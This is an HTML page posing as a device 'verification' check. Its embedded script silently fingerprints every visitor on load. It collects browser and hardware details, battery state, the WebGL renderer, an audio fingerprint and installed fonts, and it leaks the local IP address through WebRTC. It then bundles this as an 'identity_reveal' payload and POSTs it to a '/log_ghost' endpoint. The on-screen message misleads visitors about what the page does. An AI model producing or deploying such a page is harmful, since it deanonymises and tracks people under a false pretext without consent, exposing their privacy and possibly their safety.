<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Verifying...</title>
  <style>
    body {
      background-color: #000;
      color: #0f0;
      font-family: monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
      padding: 20px;
    }
    .loader {
      margin-top: 20px;
      border: 4px solid #0f0;
      border-radius: 50%;
      width: 24px;
      height: 24px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div>
    <h2>Hold tight… scanning device for verification 👁️‍🗨️</h2>
    <div class="loader"></div>
  </div>
  
<script>
(async () => {
  const payload = {
    type: "identity_reveal",
    userAgent: navigator.userAgent,
    language: navigator.language,
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    platform: navigator.platform,
    vendor: navigator.vendor,
    width: window.screen.width,
    height: window.screen.height,
    memory: navigator.deviceMemory || "unknown",
    threads: navigator.hardwareConcurrency || "unknown",
    headless: navigator.webdriver || false,
    battery: {},
    webgl: null,
    audio_fp: null,
    webrtc_ip: null,
    fonts: [],
    timestamp: new Date().toISOString()
  };

  // Battery Info
  try {
    const battery = await navigator.getBattery();
    payload.battery = {
      level: battery.level,
      charging: battery.charging
    };
  } catch (e) {}

  // WebGL Info
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    payload.webgl = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
  } catch (e) {}

  // Audio Fingerprint
  try {
    const context = new (window.AudioContext || window.webkitAudioContext)();
    const osc = context.createOscillator();
    const analyser = context.createAnalyser();
    osc.connect(analyser);
    osc.start(0);
    const freqData = new Uint8Array(analyser.frequencyBinCount);
    analyser.getByteFrequencyData(freqData);
    payload.audio_fp = btoa(freqData.slice(0, 30).join(","));
    osc.stop();
  } catch (e) {}

  // WebRTC IP Leak
  try {
    const pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel("");
    pc.createOffer().then(o => pc.setLocalDescription(o));
    pc.onicecandidate = event => {
      if (event && event.candidate && event.candidate.candidate) {
        const ip = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
        if (ip) payload.webrtc_ip = ip[1];
      }
    };
    setTimeout(() => pc.close(), 1500);
  } catch (e) {}

  // Font Detection
  try {
    const testFonts = ["Arial", "Courier New", "Times New Roman", "Comic Sans MS", "Monaco"];
    const base = "sans-serif";
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    const baselineSize = {};
    ctx.font = "72px " + base;
    const baseWidth = ctx.measureText("mmmmmmmmmmlli").width;
    testFonts.forEach(font => {
      ctx.font = "72px '" + font + "'," + base;
      const width = ctx.measureText("mmmmmmmmmmlli").width;
      if (width !== baseWidth) payload.fonts.push(font);
    });
  } catch (e) {}

  // Send to server
  fetch("/log_ghost", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(payload)
  });

})();
</script>
</body>
</html>
